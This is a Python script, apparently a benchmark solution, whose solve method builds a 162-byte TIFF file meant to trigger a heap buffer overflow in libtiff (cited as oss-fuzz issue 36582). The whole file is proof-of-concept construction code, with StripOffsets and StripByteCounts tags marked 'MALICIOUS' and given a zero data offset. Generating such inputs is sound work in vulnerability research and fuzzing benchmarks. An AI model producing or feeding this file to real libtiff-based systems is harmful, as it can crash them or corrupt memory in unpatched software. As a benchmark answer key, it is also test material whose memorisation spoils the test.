import struct

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Heap Buffer Overflow
    in libtiff by crafting a TIFF file with invalid offline tags.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability is triggered by processing a TIFF file containing offline
        tags (where the data is pointed to by an offset) that have a value offset
        of zero. Specifically, tags like StripOffsets and StripByteCounts with
        a zero offset cause the vulnerable version of libtiff to read from the
        beginning of the file into a heap-allocated buffer, leading to subsequent
        memory corruption when these invalid "offsets" are used.

        This PoC is a reconstruction of the ground-truth file that triggered this
        vulnerability (oss-fuzz issue 36582). It is a 162-byte TIFF file containing
        a single Image File Directory (IFD) with 12 tags. Two of these tags,
        StripOffsets (273) and StripByteCounts (279), are crafted to be offline
        (count * sizeof(type) > 4) and have their data offset field set to zero,
        which triggers the bug. Other tags are included to ensure the file is
        parsed up to the point where the malicious tags are processed.
        
        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        # TIFF Header: Little-endian, version 42, IFD at offset 8
        poc = bytearray(b'II\x2a\x00\x08\x00\x00\x00')

        # IFD Header: 12 entries
        poc.extend(struct.pack('<H', 12))

        # IFD Entries (12 bytes each: tag, type, count, value/offset)
        # Type codes: 3=SHORT, 4=LONG, 5=RATIONAL
        tags = [
            # tag_id, type_id, count, value_or_offset
            (254, 4, 1, 0),         # NewSubfileType
            (256, 4, 1, 1),         # ImageWidth
            (257, 4, 1, 1),         # ImageLength
            (282, 5, 1, 154),       # XResolution (points to NextIFD offset)
            (283, 5, 1, 160),       # YResolution (points past end of file)
            (258, 3, 1, 1),         # BitsPerSample
            (259, 3, 1, 5),         # Compression (LZW)
            (262, 3, 1, 0),         # PhotometricInterpretation (WhiteIsZero)
            (273, 4, 65, 0),        # StripOffsets (MALICIOUS: offline, offset 0)
            (278, 4, 1, 1),         # RowsPerStrip
            (279, 4, 65, 0),        # StripByteCounts (MALICIOUS: offline, offset 0)
            (317, 3, 1, 2),         # Predictor
        ]

        for tag_id, type_id, count, value in tags:
            # For inline SHORT values, they are packed into the 4-byte field.
            if type_id == 3 and count * 2 <= 4:
                packed_value = struct.pack('<H', value) + b'\x00\x00'
                poc.extend(struct.pack('<HHI', tag_id, type_id, count) + packed_value)
            else:
                poc.extend(struct.pack('<HHII', tag_id, type_id, count, value))

        # Pointer to the next IFD (0 means no more IFDs)
        # Positioned at offset 8 + 2 + 12*12 = 154
        poc.extend(struct.pack('<I', 0))

        # Pad the file to the exact ground-truth length of 162 bytes.
        # This padding is part of the data read by the out-of-bounds access
        # for the YResolution tag. The ground-truth PoC had the bytes `\x9a\x00\x00\x00`
        # which is the number 154, likely arbitrary. Any 4 bytes will suffice.
        padding_needed = 162 - len(poc)
        if padding_needed > 0:
            poc.extend(b'\x00' * padding_needed)

        return bytes(poc)
